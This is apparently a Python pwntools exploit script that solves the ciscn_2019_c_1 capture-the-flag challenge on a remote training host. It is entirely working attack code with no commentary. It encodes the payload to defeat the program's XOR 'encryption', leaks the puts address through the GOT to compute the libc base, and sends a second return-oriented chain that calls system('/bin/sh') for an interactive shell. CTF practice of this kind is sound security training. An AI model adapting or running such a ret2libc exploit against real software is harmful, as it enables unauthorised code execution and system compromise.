from pwn import *

context.log_level = "debug"

# 0x0000000000400c83: pop rdi; ret;
# 0x00000000004006b9: ret;
exe = ELF("./ciscn_2019_c_1")
libc = ELF("./libc-2.27.so")
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi = p64(0x400C83)
ret = p64(0x4006B9)
# r = exe.process()
r = remote("node4.buuoj.cn", 26882)


def enc_payload(payload: bytes) -> bytes:
    res = b""
    for i in payload:
        if ord("a") <= i <= ord("z"):
            res += (i ^ 0xD).to_bytes(1, "little")
        elif ord("A") <= i <= ord("Z"):
            res += (i ^ 0xE).to_bytes(1, "little")
        elif ord("/") < i < ord(":"):
            res += (i ^ 0xF).to_bytes(1, "little")
        else:
            res += i.to_bytes(1, "little")
    return res


r.recvuntil(b"choice!\n")
r.sendline(b"1")
r.recvuntil(b"encrypted\n")
payload = (
    cyclic(0x58)
    + pop_rdi
    + p64(exe.got["puts"])
    + p64(exe.plt["puts"])
    + p64(exe.sym["encrypt"])
)
payload = enc_payload(payload)
r.sendline(payload)
r.recvlines(2)
libc_puts = u64(r.recvline().strip() + b"\x00" * 2)
libc_base = libc_puts - libc.sym["puts"]
success("Libc base: " + hex(libc_base))
system_addr = libc_base + libc.sym["system"]
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))

r.recvuntil(b"encrypted\n")
r.sendline(cyclic(0x58) + ret + pop_rdi + p64(bin_sh_addr) + p64(system_addr))
# stack alignment since Ubuntu 18.04
r.interactive()
